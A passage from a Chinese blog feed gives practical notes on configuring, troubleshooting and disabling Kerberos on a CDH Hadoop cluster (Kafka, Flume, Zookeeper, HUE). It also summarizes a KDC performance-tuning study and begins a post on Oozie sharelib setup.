id="Kerberos卸载BUG"><a href="#Kerberos卸载BUG" class="headerlink" title="Kerberos卸载BUG"></a>Kerberos卸载BUG</h4><p>Linux上的KDC存在严重的卸载BUG，使用<code>yum remove</code>卸载会出现严重的问题</p><p>因为之前<code>principal</code>的认证因为人为操作出现了一些问题，所以用yum remove卸载重新安装了一下，yum remove之后出现了大问题，凡是新连接外部的命令都无法使用，包括并不限于：yum、ssh、wgt等命令，FTP工具也无法使用，这就导致了无法连接外部下载kdc安装包</p><p>还好我卸载之前连接的SSH窗口没有关闭（新的连接无法建立， 但是已经建立的连接不会断开），用的XSHELL 6，我尝试用XFTP连接，失败，但是XSHELL 6 默认输入框里就有传输文件的功能，上传四个Kerberos文件之后重新安装之后才解决了问题。</p><h4 id="Zookeeper报错"><a href="#Zookeeper报错" class="headerlink" title="Zookeeper报错"></a>Zookeeper报错</h4><p>Zk这个组件启动的时候在互相连接的装一下会报Error，这个Error曾今困扰了我挺久</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2019-02-26 18:37:15,898 WARN org.apache.zookeeper.server.NIOServerCnxn: caught end of stream exception</span><br><span class="line">EndOfStreamException: Unable to read additional data from client sessionid 0x269290a81950073, likely client has closed socket</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxn.doIO(NIOServerCnxn.java:231)</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxnFactory.run(NIOServerCnxnFactory.java:208)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure><p>其实只要Zk验证了没有问题就行了，这个报错不用纠结</p><h4 id="Kafka启动-关闭Kerberos的坑"><a href="#Kafka启动-关闭Kerberos的坑" class="headerlink" title="Kafka启动/关闭Kerberos的坑"></a>Kafka启动/关闭Kerberos的坑</h4><p>CDH集群中为Kafka启用Kerberos需要些配置之外的操作，启用Kerberos的时候容易忽略这些细节，导致kafka开启不正确， 然后关闭的时候容易把这些操作忽略了，导致关闭不彻底，在有的环节仍然关闭了Kerberos。</p><p>Kafka在CDH中的配置需要先登录CM进入kafka服务，修改<code>ssl.client.auth</code>为none，这届两个Kerberos相关的配置设为开启，接下来还要修改security.inter.broker.protocol配置为SASL_PLAINTEXT，保存以上修改的配置后，回到主页根据提示重启kafka Server,接下来就是在客户端上的配置，本身CDH就会为了Kafka生成配置文件jaas.conf，对于这个配置文件真实一言难尽，里面的配置文件会有 不起眼的错误（是关于KafkaClient和KafkaServer混淆的错误），这一个改正完毕，还有一个配置文件client.properties文件，两个文件设置完毕后，在<code>/etc/profile</code>里面设置环境变量<code>exportKAFKA_OPTS=&quot;-Djava.security.krb5.conf=/etc/krb5.conf-Djava.security.auth.login.config=/opt/kafka/kafka_client.jaas&quot;</code>，配置完毕kafka这块，关闭的时候容易忘记，必须要记得从profile中删除才行。</p><h4 id="Flume配置文件导致文件无限传输"><a href="#Flume配置文件导致文件无限传输" class="headerlink" title="Flume配置文件导致文件无限传输"></a>Flume配置文件导致文件无限传输</h4><p>Flume的配置文件出了错误，因为对Flume的KafkaChannel的不熟悉</p><p>配置的时候把Channel的sink又连接到Source上导致了数据一致循环。。。</p><p>排查之后发现了这个问题，附上Flume的配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">agent.sources = kafkaSource1</span><br><span class="line">agent.channels = kafkaChannel</span><br><span class="line">agent.sinks = hdfsSink</span><br><span class="line">agent.sources.kafkaSource1.channels = kafkaChannel</span><br><span class="line">agent.sinks.hdfsSink.channel = kafkaChannel</span><br><span class="line"></span><br><span class="line">agent.sources.kafkaSource1.type = org.apache.flume.source.kafka.KafkaSource</span><br><span class="line">agent.sources.kafkaSource1.zookeeperConnect = master126:2181</span><br><span class="line">agent.sources.kafkaSource1.topic = report.alarm,report.distance,report.track,report.acc,report.stop</span><br><span class="line">agent.sources.kafkaSource1.consumer.group.id = cloudera_mirrormaker</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.timeout.ms = 100</span><br><span class="line">agent.sources.kafkaSource1.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.sources.kafkaSource1.batchSize = 100</span><br><span class="line">agent.sources.kafkaSource1.batchDurationMillis = 1000</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.type = org.apache.flume.channel.kafka.KafkaChannel</span><br><span class="line">agent.channels.kafkaChannel.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.channels.kafkaChannel.kafka.topic = source_from_kafka</span><br><span class="line">agent.channels.kafkaChannel.consumer.group.id = flume-consumer</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.sinks.hdfsSink.type = hdfs</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosKeytab= /hdfs-keytab/hdfs.keytab</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosPrincipal= hdfs@JIMI.COM</span><br><span class="line">agent.sinks.hdfsSink.hdfs.path = hdfs://master126:8020/test/data/flume/kafka/%Y%m%d</span><br><span class="line"><span class="meta">#</span>上传文件的前缀</span><br><span class="line">agent.sinks.hdfsSink.hdfs.filePrefix = %d_%&#123;topic&#125;</span><br><span class="line"><span class="meta">#</span>是否按照时间滚动文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.round = true</span><br><span class="line"><span class="meta">#</span>多少时间单位创建一个新的文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundValue = 24</span><br><span class="line"><span class="meta">#</span>重新定义时间单位</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundUnit = hour</span><br><span class="line"><span class="meta">#</span>是否使用本地时间戳</span><br><span class="line">agent.sinks.hdfsSink.hdfs.useLocalTimeStamp = true</span><br><span class="line"><span class="meta">#</span>积攒多少个Event才flush到HDFS一次</span><br><span class="line">agent.sinks.hdfsSink.hdfs.batchSize = 200</span><br><span class="line"><span class="meta">#</span>设置文件类型，可支持压缩</span><br><span class="line">agent.sinks.hdfsSink.hdfs.fileType = DataStream</span><br><span class="line"><span class="meta">#</span>多久生成一个新的文件</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollInterval = 7200</span><br><span class="line"><span class="meta">#</span>设置每个文件的滚动大小</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollSize = 1073741824</span><br><span class="line"><span class="meta">#</span>文件的滚动与Event数量无关</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollCount = 0</span><br><span class="line">agent.sinks.hdfsSink.hdfs.writeFormat = TEXT</span><br></pre></td></tr></table></figure><p>例子中的配置文件的最终效果是从kafka的多个topic report.stop等等读取数据之后通过kafka channel，然后根据不同的topic生成不同的文件。</p><h4 id="HUE中Oozie报错，时区错误"><a href="#HUE中Oozie报错，时区错误" class="headerlink" title="HUE中Oozie报错，时区错误"></a>HUE中Oozie报错，时区错误</h4><p>发现HUE的时间和实际时间有偏差，原因是HUE的时区默认是美国，要在配置里面修改，修改成东8区即可</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2w01fhhuuj20wo05bjrg.jpg" alt></p><h4 id="系统自带的无法识别的配置文件"><a href="#系统自带的无法识别的配置文件" class="headerlink" title="系统自带的无法识别的配置文件"></a>系统自带的无法识别的配置文件</h4><p>值得一提的是这边有个错误我花了好久才发现，CDH因为是高度集成的，里面很多配置文件都是自己生成的，像Kafka的Keytab配置文件，文件里面的内容并不正确，里面指定的KafkaClient和Server根本无法识别，更改之后才可以识别。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   doNotPrompt=true</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Client &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="11-Windows下访问Kerberos-CDH集群的WebUI界面"><a href="#11-Windows下访问Kerberos-CDH集群的WebUI界面" class="headerlink" title="11.Windows下访问Kerberos CDH集群的WebUI界面"></a>11.Windows下访问Kerberos CDH集群的WebUI界面</h3><p><a href="http://web.mit.edu/kerberos/dist/" target="_blank" rel="noopener">MIT Kerberos下载地址</a></p><p>先安装windows下的Kerberos安装包，无脑安装就行了。</p><p>接着配置krb5..ini文件，将krb5.conf的内容拷贝进来，切忌不要直接更改后缀名就使用</p><p>接着启动MIT Kerberos软件</p><p>使用我们在linux KDC上注册的管理员账号登录即可。我们登录不同的服务使用到的不用的账号，这个软件貌似会通过我们这个管理员账号自己搞定。</p><p>还有一种方法，需要使用Keytab，还涉及到文件权限的问题，因为上面的方法我很轻易就成功访问了WebUI，所以第二种方法就没有尝试。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247483853&amp;idx=1&amp;sn=442a8ba87c922857253a437affe42506&amp;chksm=ec2ad1c4db5d58d2933ae5cde4ab1a7443c944e94aca85b51cbd8e9f4f3772162a39074da49d&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">更多内容访问阿里巨佬Fayson的公众号</a></p><hr><h3 id="12-禁用Kerberos需要调整的设置"><a href="#12-禁用Kerberos需要调整的设置" class="headerlink" title="12.禁用Kerberos需要调整的设置"></a>12.禁用Kerberos需要调整的设置</h3><p>说明：设置可能会随着版本变化有所变化</p><p><strong>Zookeeper</strong></p><ul><li><code>enableSecurity (Enable Kerberos Authentication)</code> : false</li><li><code>zoo.cfg</code> 的Server 高级配置代码段（安全阀）写入skipACL: yes</li></ul><p><strong>HDFS</strong></p><ul><li><code>hadoop.security.authentication</code> : Simple</li><li><code>hadoop.security.authorization</code> : false</li><li><code>dfs.datanode.address</code> : 1004 (for Kerberos) 改为 50010 (default)</li><li><code>dfs.datanode.http.address</code> : 1006 (for Kerberos) 改为 50075 (default)</li><li><code>dfs.datanode.data.dir.perm</code> : 700 改为 755</li></ul><p><strong>HBase</strong></p><ul><li><code>hbase.security.authentication</code> : Simple</li><li><code>hbase.security.authorization</code> : false</li><li><code>hbase.thrift.security.qop</code> : none</li></ul><p><strong>Hue</strong></p><ul><li><code>Kerberos Ticket Renewer</code>: 删除或停用角色</li></ul><p><strong>Kafka</strong></p><ul><li><code>kerberos.auth.enable</code>: false</li></ul><p><strong>SOLR</strong></p><ul><li><code>solr Secure Authentication</code> : Simple</li></ul><hr><h3 id="13-集群同步脚本"><a href="#13-集群同步脚本" class="headerlink" title="13.集群同步脚本"></a>13.集群同步脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">    #1 获取输入参数个数，如果没有参数，直接退出</span><br><span class="line">    pcount=$#</span><br><span class="line">    if((pcount==0)); then</span><br><span class="line">    echo no args;</span><br><span class="line">    exit;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    #2 获取文件名称</span><br><span class="line">    p1=$1</span><br><span class="line">    fname=`basename $p1`</span><br><span class="line">    echo fname=$fname</span><br><span class="line"></span><br><span class="line">    #3 获取上级目录到绝对路径</span><br><span class="line">    pdir=`cd -P $(dirname $p1); pwd`</span><br><span class="line">    echo pdir=$pdir</span><br><span class="line"></span><br><span class="line">    #4 获取当前用户名称</span><br><span class="line">    user=`whoami`</span><br><span class="line"></span><br><span class="line">    #5 循环</span><br><span class="line">    for((host=0; host&lt;2; host++)); do</span><br><span class="line">    echo ------------------- datanode$host --------------</span><br><span class="line">    rsync -rvl $pdir/$fname $user@datanode$host:$pdir</span><br><span class="line">    done</span><br></pre></td></tr></table></figure><p>要先安装rsync</p><p>yum install rsync</p><p>安装成功之后才能用这个同步命令</p><hr><h3 id="14-Kerberos优化"><a href="#14-Kerberos优化" class="headerlink" title="14.Kerberos优化"></a>14.Kerberos优化</h3><h4 id="美团优化实战"><a href="#美团优化实战" class="headerlink" title="美团优化实战"></a>美团优化实战</h4><p><strong>为什么要优化：</strong></p><p>线上单台KDC服务器最大承受QPS是多少？哪台KDC的服务即将出现压力过大的问题？为什么机器的资源非常空闲，KDC的压力却会过大？如何优化？优化后瓶颈在哪儿？如何保证监控指标的全面性、可靠性和准确性？这都是本文需要回答的问题。从本次优化工作达成的最终结果上来看，单台服务器每秒的处理性能提升16倍左右，另外通过共享内存的方式设计了一个获取KDC各项核心指标的接口，使得服务的可用性进一步提升。</p><p>名词：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v66w9mt3j212m0hw75j.jpg" alt></p><p>下图是美团的架构，整个KDC服务都部署在同一个IDC</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v697svjwj21a40zc771.jpg" alt></p><p><strong>主要优化工作</strong></p><p>通过对KDC原理的分析，很容易判断只有前两部分才可能直接给KDC服务带来压力，因此本文涉及到的工作都将围绕上一部分的前两个环节展开分析。本次优化工作采用Grinder这一开源压测工具，分别对AS、TGS两个请求过程，采用相同机型（保证硬件的一致性）在不同场景下进行了压力测试。</p><p>优化之前，线上KDC服务启动的单进程；为最低风险的完成美团和点评数据的融合，KDC中keytab都开启了PREAUTH属性；承载KDC服务的部分服务器没有做RAID。KDC服务出现故障时，机器整体资源空闲，怀疑是单进程的处理能力达到上限；PREAUTH属性进一步保证提升了KDC服务的安全性，但可能带来一定的性能开销；如果线上服务器只加载了少量的keytab信息，那么没有被加载到内存的数据必然读取磁盘，从而带来一定的IO损耗。</p><p>因此本文中，对以下三个条件进行变动，分别进行了测试：</p><ol><li>对承载KDC服务的物理机型是否做RAID10；</li><li>请求的keytab在库中是否带有PRAUTH属性；</li><li>KDC是否启动多进程（多进程设置数目和物理机核数一致）。（实际测试工作中进行了多次测试）</li></ol><p><strong>Client和AS交互过程的压测</strong></p><p>下图为AS压测的一组平均水平的测试数据，使用的物理机有40核，因此多进程测试启动40个进程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6aqpeh0j212i0gumxq.jpg" alt></p><p>分析表中的数据，很容易提出如下问题从而需要进一步探索：</p><ol><li>比较表中第一行和第二行、第三行和第四行，主机做不做RAID为什么对结果几乎无影响？</li></ol><p>该四组（测试结果为49、53、100和104所在表2中的行）数据均在达到处理能力上限一段时间后产生认证失败，分析机器的性能数据，内存、网卡、磁盘资源均没有成为系统的瓶颈，CPU资源除了某个CPU偶尔被打满，其他均很空闲。分析客户端和服务端的认证日志，服务端未见明显异常，但是客户端发现大量的Socket Timeout错误（测试设置的Socket超时时间为30s）。由于测试过程中，客户端输出的压力始终大于KDC的最大处理能力，导致KDC端的AS始终处于满负荷状态，暂时处理不了的请求必然导致排队；当排队的请求等待时间超过设置的30s后便会开始超时从而认证出错，且伴随机器某一CPU被打满（如图3）。 显然KDC单进程服务的处理能力已经达到瓶颈且瓶颈存在单核CPU的处理能力，从而决定向多进程方向进行优化测试。</p><p>单进程KDC打满某一CPU：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6d08i8dj20xk0cewga.jpg" alt></p><p>下图为本次压力测试的一个通用模型，假设KDC单位时间内的最大处理能力是A，来自客户端的请求速率稳定为B且 B&gt;A ；图中黄色区域为排队的请求数，当某一请求排队超过30s，便会导致Socket Timedout错误。</p><p>AS处理能力和Client压力模型：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6dxwvacj21380pqwg3.jpg" alt></p><ol start="2"><li>比较上上一张表中第1和3行、第2和4行、第7和8行相比，为什么有PREAUTH属性的认证QPS大致是无该属性处理能力的一半？</li></ol><p>如果Client的keytab在KDC的库中不带有PREAUTH这一属性，Client发送请求，KDC的AS模块验证其合法性之后返回正确的结果；整个过程只需要两次建立链接进行交互便可完成。如果带有PREAUTH属性，意味着该keytab的认证启动了Kerberos 5协议中的 pre-authentication概念：当AS模块收到Client的请求信息后；故意给Client返回一个错误的请求包，Client会“领悟到”这是KDC的AS端需要进行提前认证；从而Client获取自己服务器的时间戳并用自己的密钥加密发送KDC，KDC解密后和自身所在服务器的时间进行对比，如果误差在能容忍的范围内；返回给Client正确的TGT响应包；过程如下图所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6fxvq1xj220o0d0juw.jpg" alt></p><ol start="3"><li>根据对问题2的分析，CPU占用表中第5和7行的值的比例应该近似为1:2，为什么第5行的值只有115，结果和理论差距如此之大？</li></ol><p>KDC的库中对客户端的keytab开启PREAUTH属性，客户端每认证一次，KDC需要将该次认证的时间戳等信息写到本次磁盘的BDB数据库的Log中；而关闭PREAUTH属性后，每次认证只需要从库中读取数据，只要给BDB数据库分配的内存足够大，就可以最大程度的减少和本次磁盘的交互。KDC40进程且开启PRAUTH，其AS处理能力的QPS只有115，分析机器性能的相关指标，发现瓶颈果然是单盘的IO，如图6所示。使用BDB提供的工具，查看美团数据平台KDC服务的BDB缓存命中率为99%，如下图所示：</p><p>无RAID多KDC进程服务器磁盘IO：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6i16k8hj21140ccgmj.jpg" alt></p><p>美团KDC缓存命中率：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jctl01j20pa0bw76t.jpg" alt></p><ol start="4"><li>KDC AS处理能力在多进程做RAID条件下，有无preauth属性，KDC服务是否有瓶颈？如果有在哪里？</li></ol><p>经多次实验，KDC的AS处理能力受目前物理机CPU处理能力的限制，图8为有PREAUTH属性的CPU使用情况截图，无PREAUTH结果一致。</p><p>40进程有PREAUTH，AS对CPU资源的使用情况：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jsf7r8j20z2154qk7.jpg" alt></p><p><strong>Client和TGS交互过程的压测：</strong></p><p>下表为TGS压测的一组平均水平的测试数据：</p><p>TGS压测：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6kt9fnvj212g0h2t9a.jpg" alt></p><p>可以发现KDC对TGS请求的处理能力和主机是否做RAID无关,结合KDC中TGS的请求原理，就较容易理解在BDB缓存命中率足够高的条件下，TGS的请求不需要和本次磁盘交互；进一步做实验，也充分验证了这一点，机器的磁盘IO在整个测试过程中，没有大的变化，如图所示，操作系统本身偶尔产生的IO完全构不成KDC的服务瓶颈。KDC单进程多进程的对比，其处理瓶颈和AS一致，均受到CPU处理能力的限制（单进程打满某一CPU，多进程几乎占用整台机器的CPU资源）。从Kerberos的设计原理分析，很容易理解，无论KDC库中的keytab是否带有PREAUTH属性，对TGS的处理逻辑几乎没有影响，压测的数据结果从实际角度验证了这一点。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6m4az4cj224a0tawhe.jpg" alt></p><p><strong>C：其它问题</strong></p><p>Client和KDC的交互，支持TCP和UDP两种协议。在网络环境良好的情况下，两种协议的KDC的测试结果理论上和实际中几乎一致。但是在原生代码中，使用TCP协议，在客户端给KDC造成一定压力持续6s左右，客户端开始认证出错，在远未达到超时时限的情况下，Client出现了<code>socket reset</code>类的错误。KDC查看内核日志，发现大量<code>possible SYN flooding on port 8089(KDC的服务端口). Sending cookies</code>，且通过<code>netstat -s</code>发现机器的<code>xxxx times the listen queue of a socket overflowed</code>异常增高，种种现象表明可能是服务端的半连接队列、全连接队列中的一个或者全部被打满。主要原理如图10所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6mjf0tvj20ws0wuq6q.jpg" alt></p><p>发现KDC服务所在服务器：半队列<code>/proc/sys/net/ipv4/tcp_max_syn_backlog为2048</code>。</p><p>全队列：1）系统参数<code>/proc/sys/net/core/somaxconn＝65535</code>，查看代码<code>listen()</code>函数的传入值为5。</p><p>故而判断TCP的瓶颈在于全队列，因此目标为将<code>listen</code>函数的第二个<code>backlog</code>参数变成可控可传入。</p><p><strong>KDC可监控的设计和实现</strong></p><p>开源社区对Kerberos实现的KDC完全没有对外暴露可监控的接口，最初线上的场景主要通过检索Log进行相关指标的监控，在统计服务QPS、各种错误的监控等方面，存在准确准确监控难的尴尬局面。为了实现对KDC准确、较全面的监控，对KDC进行了二次开发，设计一个获取监控指标的接口。对监控的设计，主要从以下三个方面进行了考虑和设计。</p><p><strong>A.设计上的权衡</strong></p><ol><li><p>监控的设计无论在什么场景下，都应该尽可能的不去或者最小程度的影响线上的服务，本文最终采用建立一块共享内存的方式，记录各个KDC进程的打点信息，实现的架构如图11所示。每个KDC进程对应共享内存中的一块区域，通过n个数组来存储KDC n个进程的服务指标：当某个KDC进程处理一个请求后，该请求对监控指标的影响会直接打点更新到其对应的Slot 数组中。更新的过程不受锁等待更新的影响，KDC对监控打点的调用仅仅是内存块中的更新，对服务的影响几乎可以忽略不计。相比其他方式，在实现上也更加简单、易理解。</p></li><li><p>纪录每个KDC进程的服务情况，便于准确查看每个进程的对请求的处理情况，有助于定位问题多种情况下出现的异常，缩短故障的定位时间。例如：能够准确的反应出每个进程的请求分布是否均匀、请求处理出现异常能够定位到具体是某个进程出现异常还是整体均有异常。</p><p>KDC监控设计的整体架构：</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6oip712j21v80y2wlc.jpg" alt></p><p><strong>B.程序的可拓展性</strong></p><p>任何指标的采集都是随着需求进行变更的，如果程序设计上不具有良好的扩展性，会后续的指标扩展带来很大的困扰。第一版KDC监控指标的采集只区分请求的成功与失败两种类型，美团数据平台KDC库中所有的keytab都具有PREAUTH属性。根据上文可知，去掉PREAUTH属性后，AS请求的QPS能够提升一倍。后续随着服务规模的进一步增长，如果AS请求的处理能力逐步成为瓶颈，会考虑去掉PREAUTH属性。为了准确监控去掉PREAUTH属性这一过程是否有、有多少请求出现错误，需要扩展一个监控指标，因此有了KDC监控的第二版。整个过程只需要修改三个地方，完成两个功能的实现：</p><ol><li>添加指标 ；</li><li>打点逻辑的添加。</li></ol><p>整个修改过程简单明了，因此，该KDC监控程序的设计具有非常好的扩展性。图12为监控指标的罗列和注释：</p><p>KDC监控指标及含义：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6pmygs4j21440ri7d2.jpg" alt></p><p><strong>C.接口工具kstat的设计</strong></p><p>获取KDC监控指标的接口工具主要分为两种：</p><ol><li>获取当前每个KDC进程对各个指标的累积值，该功能是为了和新美大的监控平台Falcon结合，方便实现指标的上报实现累加值和分钟级别速率值的处理；</li><li>获取制定次数在制定时间间隔内每个进程监控指标的瞬时速率，最小统计间隔可达秒级，方便运维人员登陆机器无延迟的查看当前KDC的服务情况，使其在公司监控系统不可用的情况下分析服务的当前问题。具体使用见下图。</li></ol><p>kstat的使用帮助和两种功能使用样例：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6qjmveyj21s60len2w.jpg" alt></p><p><strong>总结：</strong></p><p>通过本次对KDC服务的压测实验和分析，总结出KDC最优性能的调整方案为：</p><ol><li>KDC服务本身需要开启多进程和以充分利用多核机器的CPU资源，同时确保BDB的内存资源足够，保证其缓存命中率达到一定比例（越高越好，否则查询库会带来大量的磁盘读IO）；</li><li>选择的物理机要做RAID，否则在库中keytab带有PREAUTH属性的条件下，会带来大量的写，容易导致磁盘成为KDC的性能瓶颈。通过建立一块共享内存无锁的实现了KDC多进程指标的收集，加上其良好的扩展性和数据的精确性，极大的提高了KDC服务的可靠性。</li></ol><p>相比原来线上单进程的处理能力，目前单台服务器的处理性能提升10+倍以上。本次工作没有详细的论述TCP协议中半队列、全队列的相关参数应该如何设定才能达到最优，和服务本身结合到一起，每个参数的变更带来的影响具体是什么因为过于复杂，还没有介绍。</p><hr><p><a href="https://tech.meituan.com/2019/02/14/data-security-platform-construction-practice-jiangjunling.html" target="_blank" rel="noopener">美团数据安全平台建设实践</a>  介绍了权限模型和解决方案等</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。&lt;/p&gt;
&lt;p&gt;第一次更新：2019-4-29&lt;/p&gt;
&lt;p&gt;第二次更新：2019-5-10&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="Kerberos" scheme="http://yoursite.com/tags/Kerberos/"/>
    
  </entry>
  
  <entry>
    <title>在HUE中整合Oozie和Spark2并验证</title>
    <link href="http://yoursite.com/2019/06/18/HUE%E4%B8%8AOozie%E5%92%8CSpark2%E6%95%B4%E5%90%88/"/>
    <id>http://yoursite.com/2019/06/18/HUE上Oozie和Spark2整合/</id>
    <published>2019-06-18T07:40:44.140Z</published>
    <updated>2019-05-22T08:02:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍</p></blockquote><a id="more"></a> <h3 id="查看sharelib文件夹的位置"><a href="#查看sharelib文件夹的位置" class="headerlink" title="查看sharelib文件夹的位置"></a>查看<code>sharelib</code>文件夹的位置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@master126 ~]# oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">[ShareLib update status]</span><br><span class="line">sharelibDirOld = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">host = http://master126:11000/oozie</span><br><span class="line">sharelibDirNew = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">status = Successful</span><br></pre></td></tr></table></figure><h3 id="创建文件目录"><a href="#创建文件目录" class="headerlink" title="创建文件目录"></a>创建文件目录</h3><figure class="highlight 